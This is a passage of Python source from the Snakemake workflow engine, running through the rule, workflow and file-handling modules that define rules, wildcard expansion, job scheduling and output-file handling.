            if is_flagged(item, "touch"):
                if not output:
                    raise SyntaxError(
                        "Only output files may be marked for touching.")
                self.touch_output.add(_item)
            if is_flagged(item, "dynamic"):
                if output:
                    self.dynamic_output.add(_item)
                else:
                    self.dynamic_input.add(_item)
            if is_flagged(item, "subworkflow"):
                if output:
                    raise SyntaxError(
                        "Only input files may refer to a subworkflow")
                else:
                    # record the workflow this item comes from
                    self.subworkflow_input[_item] = item.flags["subworkflow"]
            inoutput.append(_item)
            if name:
                inoutput.add_name(name)
        elif callable(item):
            if output:
                raise SyntaxError(
                    "Only input files can be specified as functions")
            inoutput.append(item)
            if name:
                inoutput.add_name(name)
        else:
            try:
                start = len(inoutput)
                for i in item:
                    self._set_inoutput_item(i, output=output)
                if name:
                    # if the list was named, make it accessible
                    inoutput.set_name(name, start, end=len(inoutput))
            except TypeError:
                raise SyntaxError(
                    "Input and output files have to be specified as strings or lists of strings.")

    @property
    def params(self):
        return self._params

    def set_params(self, *params, **kwparams):
        for item in params:
            self._set_params_item(item)
        for name, item in kwparams.items():
            self._set_params_item(item, name=name)

    def _set_params_item(self, item, name=None):
        if isinstance(item, str) or callable(item):
            self.params.append(item)
            if name:
                self.params.add_name(name)
        else:
            try:
                start = len(self.params)
                for i in item:
                    self._set_params_item(i)
                if name:
                    self.params.set_name(name, start, end=len(self.params))
            except TypeError:
                raise SyntaxError("Params have to be specified as strings.")

    @property
    def log(self):
        return self._log

    def set_log(self, *logs, **kwlogs):
        for item in logs:
            self._set_log_item(item)
        for name, item in kwlogs.items():
            self._set_log_item(item, name=name)

    def _set_log_item(self, item, name=None):
        if isinstance(item, str) or callable(item):
            self.log.append(IOFile(item,
                                   rule=self)
                            if isinstance(item, str) else item)
            if name:
                self.log.add_name(name)
        else:
            try:
                start = len(self.log)
                for i in item:
                    self._set_log_item(i)
                if name:
                    self.log.set_name(name, start, end=len(self.log))
            except TypeError:
                raise SyntaxError("Log files have to be specified as strings.")

    def expand_wildcards(self, wildcards=None):
        """
        Expand wildcards depending on the requested output
        or given wildcards dict.
        """

        def concretize_iofile(f, wildcards):
            if not isinstance(f, _IOFile):
                return IOFile(f, rule=self)
            else:
                return f.apply_wildcards(wildcards,
                                         fill_missing=f in self.dynamic_input,
                                         fail_dynamic=self.dynamic_output)

        def _apply_wildcards(newitems, olditems, wildcards, wildcards_obj,
                             concretize=apply_wildcards,
                             ruleio=None):
            for name, item in olditems.allitems():
                start = len(newitems)
                is_iterable = True
                if callable(item):
                    try:
                        item = item(wildcards_obj)
                    except (Exception, BaseException) as e:
                        raise InputFunctionException(e, rule=self)
                    if not_iterable(item):
                        item = [item]
                        is_iterable = False
                    for item_ in item:
                        if not isinstance(item_, str):
                            raise RuleException(
                                "Input function did not return str or list of str.",
                                rule=self)
                        concrete = concretize(item_, wildcards)
                        newitems.append(concrete)
                        if ruleio is not None:
                            ruleio[concrete] = item_
                else:
                    if not_iterable(item):
                        item = [item]
                        is_iterable = False
                    for item_ in item:
                        concrete = concretize(item_, wildcards)
                        newitems.append(concrete)
                        if ruleio is not None:
                            ruleio[concrete] = item_
                if name:
                    newitems.set_name(
                        name, start,
                        end=len(newitems) if is_iterable else None)

        if wildcards is None:
            wildcards = dict()
        missing_wildcards = self.wildcard_names - set(wildcards.keys())

        if missing_wildcards:
            raise RuleException(
                "Could not resolve wildcards in rule {}:\n{}".format(
                    self.name, "\n".join(self.wildcard_names)),
                lineno=self.lineno,
                snakefile=self.snakefile)

        ruleio = dict()

        try:
            input = InputFiles()
            wildcards_obj = Wildcards(fromdict=wildcards)
            _apply_wildcards(input, self.input, wildcards, wildcards_obj,
                             concretize=concretize_iofile,
                             ruleio=ruleio)

            params = Params()
            _apply_wildcards(params, self.params, wildcards, wildcards_obj)

            output = OutputFiles(o.apply_wildcards(wildcards)
                                 for o in self.output)
            output.take_names(self.output.get_names())

            dependencies = {
                None if f is None else f.apply_wildcards(wildcards): rule
                for f, rule in self.dependencies.items()
            }

            ruleio.update(dict((f, f_) for f, f_ in zip(output, self.output)))

            log = Log()
            _apply_wildcards(log, self.log, wildcards, wildcards_obj,
                             concretize=concretize_iofile)

            benchmark = self.benchmark.apply_wildcards(
                wildcards) if self.benchmark else None
            return input, output, params, log, benchmark, ruleio, dependencies
        except WildcardError as ex:
            # this can only happen if an input contains an unresolved wildcard.
            raise RuleException(
                "Wildcards in input, params, log or benchmark file of rule {} cannot be "
                "determined from output files:\n{}".format(self, str(ex)),
                lineno=self.lineno,
                snakefile=self.snakefile)

    def is_producer(self, requested_output):
        """
        Returns True if this rule is a producer of the requested output.
        """
        try:
            for o in self.products:
                if o.match(requested_output):
                    return True
            return False
        except sre_constants.error as ex:
            raise IOFileException("{} in wildcard statement".format(ex),
                                  snakefile=self.snakefile,
                                  lineno=self.lineno)
        except ValueError as ex:
            raise IOFileException("{}".format(ex),
                                  snakefile=self.snakefile,
                                  lineno=self.lineno)

    def get_wildcards(self, requested_output):
        """
        Update the given wildcard dictionary by matching regular expression
        output files to the requested concrete ones.

        Arguments
        wildcards -- a dictionary of wildcards
        requested_output -- a concrete filepath
        """
        if requested_output is None:
            return dict()
        bestmatchlen = 0
        bestmatch = None

        for o in self.products:
            match = o.match(requested_output)
            if match:
                l = self.get_wildcard_len(match.groupdict())
                if not bestmatch or bestmatchlen > l:
                    bestmatch = match.groupdict()
                    bestmatchlen = l
        return bestmatch

    @staticmethod
    def get_wildcard_len(wildcards):
        """
        Return the length of the given wildcard values.

        Arguments
        wildcards -- a dict of wildcards
        """
        return sum(map(len, wildcards.values()))

    def __lt__(self, rule):
        comp = self.workflow._ruleorder.compare(self, rule)
        return comp < 0

    def __gt__(self, rule):
        comp = self.workflow._ruleorder.compare(self, rule)
        return comp > 0

    def __str__(self):
        return self.name

    def __hash__(self):
        return self.name.__hash__()

    def __eq__(self, other):
        return self.name == other.name


class Ruleorder:
    def __init__(self):
        self.order = list()

    def add(self, *rulenames):
        """
        Records the order of given rules as rule1 > rule2 > rule3, ...
        """
        self.order.append(list(rulenames))

    def compare(self, rule1, rule2):
        """
        Return whether rule2 has a higher priority than rule1.
        """
        # try the last clause first,
        # i.e. clauses added later overwrite those before.
        for clause in reversed(self.order):
            try:
                i = clause.index(rule1.name)
                j = clause.index(rule2.name)
                # rules with higher priority should have a smaller index
                comp = j - i
                if comp < 0:
                    comp = -1
                elif comp > 0:
                    comp = 1
                return comp
            except ValueError:
                pass

        # if not ruleorder given, prefer rule without wildcards
        wildcard_cmp = rule2.has_wildcards() - rule1.has_wildcards()
        if wildcard_cmp != 0:
            return wildcard_cmp

        return 0

    def __iter__(self):
        return self.order.__iter__()

__author__ = "Johannes Kster"
__copyright__ = "Copyright 2015, Johannes Kster"
__email__ = "koester@jimmy.harvard.edu"
__license__ = "MIT"

import re
import os
import sys
import signal
import json
import urllib
from collections import OrderedDict
from itertools import filterfalse, chain
from functools import partial
from operator import attrgetter

from snakemake.logging import logger, format_resources, format_resource_names
from snakemake.rules import Rule, Ruleorder
from snakemake.exceptions import RuleException, CreateRuleException, \
    UnknownRuleException, NoRulesException, print_exception, WorkflowError
from snakemake.shell import shell
from snakemake.dag import DAG
from snakemake.scheduler import JobScheduler
from snakemake.parser import parse
import snakemake.io
from snakemake.io import protected, temp, temporary, expand, dynamic, glob_wildcards, flag, not_iterable, touch                    
from snakemake.persistence import Persistence
from snakemake.utils import update_config


class Workflow:
    def __init__(self,
                 snakefile=None,
                 snakemakepath=None,
                 jobscript=None,
                 overwrite_shellcmd=None,
                 overwrite_config=dict(),
                 overwrite_workdir=None,
                 overwrite_configfile=None,
                 config_args=None,
                 debug=False):
        """
        Create the controller.
        """
        self._rules = OrderedDict()
        self.first_rule = None
        self._workdir = None
        self.overwrite_workdir = overwrite_workdir
        self.workdir_init = os.path.abspath(os.curdir)
        self._ruleorder = Ruleorder()
        self._localrules = set()
        self.linemaps = dict()
        self.rule_count = 0
        self.basedir = os.path.dirname(snakefile)
        self.snakefile = os.path.abspath(snakefile)
        self.snakemakepath = snakemakepath
        self.included = []
        self.included_stack = []
        self.jobscript = jobscript
        self.persistence = None
        self.global_resources = None
        self.globals = globals()
        self._subworkflows = dict()
        self.overwrite_shellcmd = overwrite_shellcmd
        self.overwrite_config = overwrite_config
        self.overwrite_configfile = overwrite_configfile
        self.config_args = config_args
        self._onsuccess = lambda log: None
        self._onerror = lambda log: None
        self.debug = debug

        global config
        config = dict()
        config.update(self.overwrite_config)

        global rules
        rules = Rules()

    @property
    def subworkflows(self):
        return self._subworkflows.values()

    @property
    def rules(self):
        return self._rules.values()

    @property
    def concrete_files(self):
        return (
            file
            for rule in self.rules for file in chain(rule.input, rule.output)
            if not callable(file) and not file.contains_wildcard()
        )

    def check(self):
        for clause in self._ruleorder:
            for rulename in clause:
                if not self.is_rule(rulename):
                    raise UnknownRuleException(
                        rulename,
                        prefix="Error in ruleorder definition.")

    def add_rule(self, name=None, lineno=None, snakefile=None):
        """
        Add a rule.
        """
        if name is None:
            name = str(len(self._rules) + 1)
        if self.is_rule(name):
            raise CreateRuleException(
                "The name {} is already used by another rule".format(name))
        rule = Rule(name, self, lineno=lineno, snakefile=snakefile)
        self._rules[rule.name] = rule
        self.rule_count += 1
        if not self.first_rule:
            self.first_rule = rule.name
        return name

    def is_rule(self, name):
        """
        Return True if name is the name of a rule.

        Arguments
        name -- a name
        """
        return name in self._rules

    def get_rule(self, name):
        """
        Get rule by name.

        Arguments
        name -- the name of the rule
        """
        if not self._rules:
            raise NoRulesException()
        if not name in self._rules:
            raise UnknownRuleException(name)
        return self._rules[name]

    def list_rules(self, only_targets=False):
        rules = self.rules
        if only_targets:
            rules = filterfalse(Rule.has_wildcards, rules)
        for rule in rules:
            logger.rule_info(name=rule.name, docstring=rule.docstring)

    def list_resources(self):
        for resource in set(
            resource for rule in self.rules for resource in rule.resources):
            if resource not in "_cores _nodes".split():
                logger.info(resource)

    def is_local(self, rule):
        return rule.name in self._localrules or rule.norun

    def execute(self,
                targets=None,
                dryrun=False,
                touch=False,
                cores=1,
                nodes=1,
                local_cores=1,
                forcetargets=False,
                forceall=False,
                forcerun=None,
                prioritytargets=None,
                quiet=False,
                keepgoing=False,
                printshellcmds=False,
                printreason=False,
                printdag=False,
                cluster=None,
                cluster_config=None,
                cluster_sync=None,
                jobname=None,
                immediate_submit=False,
                ignore_ambiguity=False,
                printrulegraph=False,
                printd3dag=False,
                drmaa=None,
                stats=None,
                force_incomplete=False,
                ignore_incomplete=False,
                list_version_changes=False,
                list_code_changes=False,
                list_input_changes=False,
                list_params_changes=False,
                summary=False,
                detailed_summary=False,
                latency_wait=3,
                benchmark_repeats=3,
                wait_for_files=None,
                nolock=False,
                unlock=False,
                resources=None,
                notemp=False,
                nodeps=False,
                cleanup_metadata=None,
                subsnakemake=None,
                updated_files=None,
                keep_target_files=False,
                allowed_rules=None,
                greediness=1.0,
                no_hooks=False):

        self.global_resources = dict() if resources is None else resources
        self.global_resources["_cores"] = cores
        self.global_resources["_nodes"] = nodes

        def rules(items):
            return map(self._rules.__getitem__, filter(self.is_rule, items))

        if keep_target_files:

            def files(items):
                return filterfalse(self.is_rule, items)
        else:

            def files(items):
                return map(os.path.relpath, filterfalse(self.is_rule, items))

        if not targets:
            targets = [self.first_rule
                       ] if self.first_rule is not None else list()
        if prioritytargets is None:
            prioritytargets = list()
        if forcerun is None:
            forcerun = list()

        priorityrules = set(rules(prioritytargets))
        priorityfiles = set(files(prioritytargets))
        forcerules = set(rules(forcerun))
        forcefiles = set(files(forcerun))
        targetrules = set(chain(rules(targets),
                                filterfalse(Rule.has_wildcards, priorityrules),
                                filterfalse(Rule.has_wildcards, forcerules)))
        targetfiles = set(chain(files(targets), priorityfiles, forcefiles))
        if forcetargets:
            forcefiles.update(targetfiles)
            forcerules.update(targetrules)

        rules = self.rules
        if allowed_rules:
            rules = [rule for rule in rules if rule.name in set(allowed_rules)]

        if wait_for_files is not None:
            try:
                snakemake.io.wait_for_files(wait_for_files,
                                            latency_wait=latency_wait)
            except IOError as e:
                logger.error(str(e))
                return False

        dag = DAG(
            self, rules,
            dryrun=dryrun,
            targetfiles=targetfiles,
            targetrules=targetrules,
            forceall=forceall,
            forcefiles=forcefiles,
            forcerules=forcerules,
            priorityfiles=priorityfiles,
            priorityrules=priorityrules,
            ignore_ambiguity=ignore_ambiguity,
            force_incomplete=force_incomplete,
            ignore_incomplete=ignore_incomplete or printdag or printrulegraph,
            notemp=notemp)

        self.persistence = Persistence(
            nolock=nolock,
            dag=dag,
            warn_only=dryrun or printrulegraph or printdag or summary or
            list_version_changes or list_code_changes or list_input_changes or
            list_params_changes)

        if cleanup_metadata:
            for f in cleanup_metadata:
                self.persistence.cleanup_metadata(f)
            return True

        dag.init()
        dag.check_dynamic()

        if unlock:
            try:
                self.persistence.cleanup_locks()
                logger.info("Unlocking working directory.")
                return True
            except IOError:
                logger.error("Error: Unlocking the directory {} failed. Maybe "
                             "you don't have the permissions?")
                return False
        try:
            self.persistence.lock()
        except IOError:
            logger.error(
                "Error: Directory cannot be locked. Please make "
                "sure that no other Snakemake process is trying to create "
                "the same files in the following directory:\n{}\n"
                "If you are sure that no other "
                "instances of snakemake are running on this directory, "
                "the remaining lock was likely caused by a kill signal or "
                "a power loss. It can be removed with "
                "the --unlock argument.".format(os.getcwd()))
            return False

        if self.subworkflows and not printdag and not printrulegraph:
            # backup globals
            globals_backup = dict(self.globals)
            # execute subworkflows
            for subworkflow in self.subworkflows:
                subworkflow_targets = subworkflow.targets(dag)
                updated = list()
                if subworkflow_targets:
                    logger.info(
                        "Executing subworkflow {}.".format(subworkflow.name))
                    if not subsnakemake(subworkflow.snakefile,
                                        workdir=subworkflow.workdir,
                                        targets=subworkflow_targets,
                                        updated_files=updated):
                        return False
                    dag.updated_subworkflow_files.update(subworkflow.target(f)
                                                         for f in updated)
                else:
                    logger.info("Subworkflow {}: Nothing to be done.".format(
                        subworkflow.name))
            if self.subworkflows:
                logger.info("Executing main workflow.")
            # rescue globals
            self.globals.update(globals_backup)

        dag.check_incomplete()
        dag.postprocess()

        if nodeps:
            missing_input = [f for job in dag.targetjobs for f in job.input
                             if dag.needrun(job) and not os.path.exists(f)]
            if missing_input:
                logger.error(
                    "Dependency resolution disabled (--nodeps) "
                    "but missing input "
                    "files detected. If this happens on a cluster, please make sure "
                    "that you handle the dependencies yourself or turn of "
                    "--immediate-submit. Missing input files:\n{}".format(
                        "\n".join(missing_input)))
                return False

        updated_files.extend(f for job in dag.needrun_jobs for f in job.output)

        if printd3dag:
            dag.d3dag()
            return True
        elif printdag:
            print(dag)
            return True
        elif printrulegraph:
            print(dag.rule_dot())
            return True
        elif summary:
            print("\n".join(dag.summary(detailed=False)))
            return True
        elif detailed_summary:
            print("\n".join(dag.summary(detailed=True)))
            return True
        elif list_version_changes:
            items = list(
                chain(*map(self.persistence.version_changed, dag.jobs)))
            if items:
                print(*items, sep="\n")
            return True
        elif list_code_changes:
            items = list(chain(*map(self.persistence.code_changed, dag.jobs)))
            if items:
                print(*items, sep="\n")
            return True
        elif list_input_changes:
            items = list(chain(*map(self.persistence.input_changed, dag.jobs)))
            if items:
                print(*items, sep="\n")
            return True
        elif list_params_changes:
            items = list(
                chain(*map(self.persistence.params_changed, dag.jobs)))
            if items:
                print(*items, sep="\n")
            return True

        scheduler = JobScheduler(self, dag, cores,
                                 local_cores=local_cores,
                                 dryrun=dryrun,
                                 touch=touch,
                                 cluster=cluster,
                                 cluster_config=cluster_config,
                                 cluster_sync=cluster_sync,
                                 jobname=jobname,
                                 immediate_submit=immediate_submit,
                                 quiet=quiet,
                                 keepgoing=keepgoing,
                                 drmaa=drmaa,
                                 printreason=printreason,
                                 printshellcmds=printshellcmds,
                                 latency_wait=latency_wait,
                                 benchmark_repeats=benchmark_repeats,
                                 greediness=greediness)

        if not dryrun and not quiet:
            if len(dag):
                if cluster or cluster_sync or drmaa:
                    logger.resources_info(
                        "Provided cluster nodes: {}".format(nodes))
                else:
                    logger.resources_info("Provided cores: {}".format(cores))
                    logger.resources_info("Rules claiming more threads will be scaled down.")
                provided_resources = format_resources(resources)
                if provided_resources:
                    logger.resources_info(
                        "Provided resources: " + provided_resources)
                ignored_resources = format_resource_names(
                    set(resource for job in dag.needrun_jobs for resource in
                        job.resources_dict if resource not in resources))
                if ignored_resources:
                    logger.resources_info(
                        "Ignored resources: " + ignored_resources)
                logger.run_info("\n".join(dag.stats()))
            else:
                logger.info("Nothing to be done.")
        if dryrun and not len(dag):
            logger.info("Nothing to be done.")

        success = scheduler.schedule()

        if success:
            if dryrun:
                if not quiet and len(dag):
                    logger.run_info("\n".join(dag.stats()))
            elif stats:
                scheduler.stats.to_json(stats)
            if not dryrun and not no_hooks:
                self._onsuccess(logger.get_logfile())
            return True
        else:
            if not dryrun and not no_hooks:
                self._onerror(logger.get_logfile())
            return False

    def include(self, snakefile,
                overwrite_first_rule=False,
                print_compilation=False,
                overwrite_shellcmd=None):
        """
        Include a snakefile.
        """
        # check if snakefile is a path to the filesystem
        if not urllib.parse.urlparse(snakefile).scheme:
            if not os.path.isabs(snakefile) and self.included_stack:
                current_path = os.path.dirname(self.included_stack[-1])
                snakefile = os.path.join(current_path, snakefile)
            snakefile = os.path.abspath(snakefile)
        # else it could be an url.
        # at least we don't want to modify the path for clarity.

        if snakefile in self.included:
            logger.info("Multiple include of {} ignored".format(snakefile))
            return
        self.included.append(snakefile)
        self.included_stack.append(snakefile)

        global workflow

        workflow = self

        first_rule = self.first_rule
        code, linemap = parse(snakefile,
                              overwrite_shellcmd=self.overwrite_shellcmd)

        if print_compilation:
            print(code)

        # insert the current directory into sys.path
        # this allows to import modules from the workflow directory
        sys.path.insert(0, os.path.dirname(snakefile))

        self.linemaps[snakefile] = linemap
        exec(compile(code, snakefile, "exec"), self.globals)
        if not overwrite_first_rule:
            self.first_rule = first_rule
        self.included_stack.pop()

    def onsuccess(self, func):
        self._onsuccess = func

    def onerror(self, func):
        self._onerror = func

    def workdir(self, workdir):
        if self.overwrite_workdir is None:
            if not os.path.exists(workdir):
                os.makedirs(workdir)
            self._workdir = workdir
            os.chdir(workdir)

    def configfile(self, jsonpath):
        """ Update the global config with the given dictionary. """
        global config
        c = snakemake.io.load_configfile(jsonpath)
        update_config(config, c)
        update_config(config, self.overwrite_config)

    def ruleorder(self, *rulenames):
        self._ruleorder.add(*rulenames)

    def subworkflow(self, name, snakefile=None, workdir=None):
        sw = Subworkflow(self, name, snakefile, workdir)
        self._subworkflows[name] = sw
        self.globals[name] = sw.target

    def localrules(self, *rulenames):
        self._localrules.update(rulenames)

    def rule(self, name=None, lineno=None, snakefile=None):
        name = self.add_rule(name, lineno, snakefile)
        rule = self.get_rule(name)

        def decorate(ruleinfo):
            if ruleinfo.input:
                rule.set_input(*ruleinfo.input[0], **ruleinfo.input[1])
            if ruleinfo.output:
                rule.set_output(*ruleinfo.output[0], **ruleinfo.output[1])
            if ruleinfo.params:
                rule.set_params(*ruleinfo.params[0], **ruleinfo.params[1])
            if ruleinfo.threads:
                if not isinstance(ruleinfo.threads, int):
                    raise RuleException("Threads value has to be an integer.",
                                        rule=rule)
                rule.resources["_cores"] = ruleinfo.threads
            if ruleinfo.resources:
                args, resources = ruleinfo.resources
                if args:
                    raise RuleException("Resources have to be named.")
                if not all(map(lambda r: isinstance(r, int),
                               resources.values())):
                    raise RuleException(
                        "Resources values have to be integers.",
                        rule=rule)
                rule.resources.update(resources)
            if ruleinfo.priority:
                if (not isinstance(ruleinfo.priority, int) and
                    not isinstance(ruleinfo.priority, float)):
                    raise RuleException("Priority values have to be numeric.",
                                        rule=rule)
                rule.priority = ruleinfo.priority
            if ruleinfo.version:
                rule.version = ruleinfo.version
            if ruleinfo.log:
                rule.set_log(*ruleinfo.log[0], **ruleinfo.log[1])
            if ruleinfo.message:
                rule.message = ruleinfo.message
            if ruleinfo.benchmark:
                rule.benchmark = ruleinfo.benchmark
            rule.norun = ruleinfo.norun
            rule.docstring = ruleinfo.docstring
            rule.run_func = ruleinfo.func
            rule.shellcmd = ruleinfo.shellcmd
            ruleinfo.func.__name__ = "__{}".format(name)
            self.globals[ruleinfo.func.__name__] = ruleinfo.func
            setattr(rules, name, rule)
            return ruleinfo.func

        return decorate

    def docstring(self, string):
        def decorate(ruleinfo):
            ruleinfo.docstring = string
            return ruleinfo

        return decorate

    def input(self, *paths, **kwpaths):
        def decorate(ruleinfo):
            ruleinfo.input = (paths, kwpaths)
            return ruleinfo

        return decorate

    def output(self, *paths, **kwpaths):
        def decorate(ruleinfo):
            ruleinfo.output = (paths, kwpaths)
            return ruleinfo

        return decorate

    def params(self, *params, **kwparams):
        def decorate(ruleinfo):
            ruleinfo.params = (params, kwparams)
            return ruleinfo

        return decorate

    def message(self, message):
        def decorate(ruleinfo):
            ruleinfo.message = message
            return ruleinfo

        return decorate

    def benchmark(self, benchmark):
        def decorate(ruleinfo):
            ruleinfo.benchmark = benchmark
            return ruleinfo

        return decorate

    def threads(self, threads):
        def decorate(ruleinfo):
            ruleinfo.threads = threads
            return ruleinfo

        return decorate

    def resources(self, *args, **resources):
        def decorate(ruleinfo):
            ruleinfo.resources = (args, resources)
            return ruleinfo

        return decorate

    def priority(self, priority):
        def decorate(ruleinfo):
            ruleinfo.priority = priority
            return ruleinfo

        return decorate

    def version(self, version):
        def decorate(ruleinfo):
            ruleinfo.version = version
            return ruleinfo

        return decorate

    def log(self, *logs, **kwlogs):
        def decorate(ruleinfo):
            ruleinfo.log = (logs, kwlogs)
            return ruleinfo

        return decorate

    def shellcmd(self, cmd):
        def decorate(ruleinfo):
            ruleinfo.shellcmd = cmd
            return ruleinfo

        return decorate

    def norun(self):
        def decorate(ruleinfo):
            ruleinfo.norun = True
            return ruleinfo

        return decorate

    def run(self, func):
        return RuleInfo(func)

    @staticmethod
    def _empty_decorator(f):
        return f


class RuleInfo:
    def __init__(self, func):
        self.func = func
        self.shellcmd = None
        self.norun = False
        self.input = None
        self.output = None
        self.params = None
        self.message = None
        self.benchmark = None
        self.threads = None
        self.resources = None
        self.priority = None
        self.version = None
        self.log = None
        self.docstring = None


class Subworkflow:
    def __init__(self, workflow, name, snakefile, workdir):
        self.workflow = workflow
        self.name = name
        self._snakefile = snakefile
        self._workdir = workdir

    @property
    def snakefile(self):
        if self._snakefile is None:
            return os.path.abspath(os.path.join(self.workdir, "Snakefile"))
        if not os.path.isabs(self._snakefile):
            return os.path.abspath(os.path.join(self.workflow.basedir,
                                                self._snakefile))
        return self._snakefile

    @property
    def workdir(self):
        workdir = "." if self._workdir is None else self._workdir
        if not os.path.isabs(workdir):
            return os.path.abspath(os.path.join(self.workflow.basedir,
                                                workdir))
        return workdir

    def target(self, paths):
        if not_iterable(paths):
            return flag(os.path.join(self.workdir, paths), "subworkflow", self)
        return [self.target(path) for path in paths]

    def targets(self, dag):
        return [f for job in dag.jobs for f in job.subworkflow_input
                if job.subworkflow_input[f] is self]


class Rules:
    """ A namespace for rules so that they can be accessed via dot notation. """
    pass


def srcdir(path):
    """Return the absolute path, relative to the source directory of the current Snakefile."""
    if not workflow.included_stack:
        return None
    return os.path.join(os.path.dirname(workflow.included_stack[-1]), path)

__author__ = "Johannes Kster"
__copyright__ = "Copyright 2015, Johannes Kster"
__email__ = "koester@jimmy.harvard.edu"
__license__ = "MIT"

import os
import re
import stat
import time
import json
from itertools import product, chain
from collections import Iterable, namedtuple
from snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError                    
from snakemake.logging import logger


def lstat(f):
    return os.stat(f, follow_symlinks=os.stat not in os.supports_follow_symlinks)


def lutime(f, times):
    return os.utime(f, times, follow_symlinks=os.utime not in os.supports_follow_symlinks)


def lchmod(f, mode):
    return os.chmod(f, mode, follow_symlinks=os.chmod not in os.supports_follow_symlinks)


def IOFile(file, rule=None):
    f = _IOFile(file)
    f.rule = rule
    return f


class _IOFile(str):
    """
    A file that is either input or output of a rule.
    """

    dynamic_fill = "__snakemake_dynamic__"

    def __new__(cls, file):
        obj = str.__new__(cls, file)
        obj._is_function = type(file).__name__ == "function"
        obj._file = file
        obj.rule = None
        obj._regex = None
        return obj

    @property
    def file(self):
        if not self._is_function:
            return self._file
        else:
            raise ValueError("This IOFile is specified as a function and "
                             "may not be used directly.")

    @property
    def exists(self):
        return os.path.exists(self.file)

    @property
    def protected(self):                    
        return self.exists and not os.access(self.file, os.W_OK)                    

    @property
    def mtime(self):
        # do not follow symlinks for modification time
        return lstat(self.file).st_mtime

    @property
    def size(self):
        # follow symlinks but throw error if invalid
        self.check_broken_symlink()
        return os.path.getsize(self.file)

    def check_broken_symlink(self):
        """ Raise WorkflowError if file is a broken symlink. """
        if not self.exists and lstat(self.file):                    
            raise WorkflowError("File {} seems to be a broken symlink.".format(self.file))

    def is_newer(self, time):
        return self.mtime > time

    def prepare(self):
        path_until_wildcard = re.split(self.dynamic_fill, self.file)[0]
        dir = os.path.dirname(path_until_wildcard)
        if len(dir) > 0 and not os.path.exists(dir):
            try:
                os.makedirs(dir)
            except OSError as e:
                # ignore Errno 17 "File exists" (reason: multiprocessing)
                if e.errno != 17:
                    raise e

    def protect(self):
        mode = (lstat(self.file).st_mode & ~stat.S_IWUSR & ~stat.S_IWGRP & ~
                stat.S_IWOTH)
        if os.path.isdir(self.file):
            for root, dirs, files in os.walk(self.file):
                for d in dirs:
                    lchmod(os.path.join(self.file, d), mode)
                for f in files:
                    lchmod(os.path.join(self.file, f), mode)
        else:
            lchmod(self.file, mode)

    def remove(self):
        remove(self.file)

    def touch(self):                    
        try:
            lutime(self.file, None)                    
        except OSError as e:
            if e.errno == 2:
                raise MissingOutputException(
                    "Output file {} of rule {} shall be touched but "
                    "does not exist.".format(self.file, self.rule.name),
                    lineno=self.rule.lineno,
                    snakefile=self.rule.snakefile)
            else:
                raise e

    def touch_or_create(self):
        try:
            self.touch()
        except MissingOutputException:
            # create empty file
            with open(self.file, "w") as f:
                pass

    def apply_wildcards(self, wildcards,
                        fill_missing=False,
                        fail_dynamic=False):
        f = self._file
        if self._is_function:
            f = self._file(Namedlist(fromdict=wildcards))

        return IOFile(apply_wildcards(f, wildcards,                    
                                      fill_missing=fill_missing,
                                      fail_dynamic=fail_dynamic,
                                      dynamic_fill=self.dynamic_fill),
                      rule=self.rule)                    

    def get_wildcard_names(self):
        return get_wildcard_names(self.file)

    def contains_wildcard(self):
        return contains_wildcard(self.file)

    def regex(self):
        if self._regex is None:
            # compile a regular expression
            self._regex = re.compile(regex(self.file))
        return self._regex

    def constant_prefix(self):
        first_wildcard = _wildcard_regex.search(self.file)
        if first_wildcard:
            return self.file[:first_wildcard.start()]
        return self.file

    def match(self, target):
        return self.regex().match(target) or None

    def format_dynamic(self):
        return self.replace(self.dynamic_fill, "{*}")

    def __eq__(self, other):
        f = other._file if isinstance(other, _IOFile) else other
        return self._file == f

    def __hash__(self):
        return self._file.__hash__()


_wildcard_regex = re.compile(
    "\{\s*(?P<name>\w+?)(\s*,\s*(?P<constraint>([^\{\}]+|\{\d+(,\d+)?\})*))?\s*\}")

#    "\{\s*(?P<name>\w+?)(\s*,\s*(?P<constraint>[^\}]*))?\s*\}")


def wait_for_files(files, latency_wait=3):
    """Wait for given files to be present in filesystem."""
    files = list(files)
    get_missing = lambda: [f for f in files if not os.path.exists(f)]
    missing = get_missing()
    if missing:
        logger.info("Waiting at most {} seconds for missing files.".format(
            latency_wait))
        for _ in range(latency_wait):
            if not get_missing():
                return
            time.sleep(1)
        raise IOError("Missing files after {} seconds:\n{}".format(
            latency_wait, "\n".join(get_missing())))


def get_wildcard_names(pattern):
    return set(match.group('name')
               for match in _wildcard_regex.finditer(pattern))


def contains_wildcard(path):
    return _wildcard_regex.search(path) is not None


def remove(file):
    if os.path.exists(file):
        if os.path.isdir(file):
            try:
                os.removedirs(file)
            except OSError:
                # ignore non empty directories
                pass
        else:
            os.remove(file)


def regex(filepattern):
    f = []
    last = 0
    wildcards = set()
    for match in _wildcard_regex.finditer(filepattern):
        f.append(re.escape(filepattern[last:match.start()]))
        wildcard = match.group("name")
        if wildcard in wildcards:
            if match.group("constraint"):
                raise ValueError(
                    "If multiple wildcards of the same name "
                    "appear in a string, eventual constraints have to be defined "
                    "at the first occurence and will be inherited by the others.")
            f.append("(?P={})".format(wildcard))
        else:
            wildcards.add(wildcard)
            f.append("(?P<{}>{})".format(wildcard, match.group("constraint") if
                                         match.group("constraint") else ".+"))
        last = match.end()
    f.append(re.escape(filepattern[last:]))
    f.append("$")  # ensure that the match spans the whole file
    return "".join(f)


def apply_wildcards(pattern, wildcards,
                    fill_missing=False,
                    fail_dynamic=False,
                    dynamic_fill=None,
                    keep_dynamic=False):
    def format_match(match):
        name = match.group("name")
        try:
            value = wildcards[name]
            if fail_dynamic and value == dynamic_fill:
                raise WildcardError(name)
            return str(value)  # convert anything into a str
        except KeyError as ex:
            if keep_dynamic:
                return "{{{}}}".format(name)
            elif fill_missing:
                return dynamic_fill
            else:
                raise WildcardError(str(ex))

    return re.sub(_wildcard_regex, format_match, pattern)


def not_iterable(value):
    return isinstance(value, str) or not isinstance(value, Iterable)


class AnnotatedString(str):
    def __init__(self, value):
        self.flags = dict()


def flag(value, flag_type, flag_value=True):
    if isinstance(value, AnnotatedString):
        value.flags[flag_type] = flag_value
        return value
    if not_iterable(value):
        value = AnnotatedString(value)
        value.flags[flag_type] = flag_value
        return value
    return [flag(v, flag_type, flag_value=flag_value) for v in value]


def is_flagged(value, flag):
    if isinstance(value, AnnotatedString):
        return flag in value.flags                    
    return False


def temp(value):
    """
    A flag for an input or output file that shall be removed after usage.
    """
    if is_flagged(value, "protected"):
        raise SyntaxError(
            "Protected and temporary flags are mutually exclusive.")
    return flag(value, "temp")


def temporary(value):
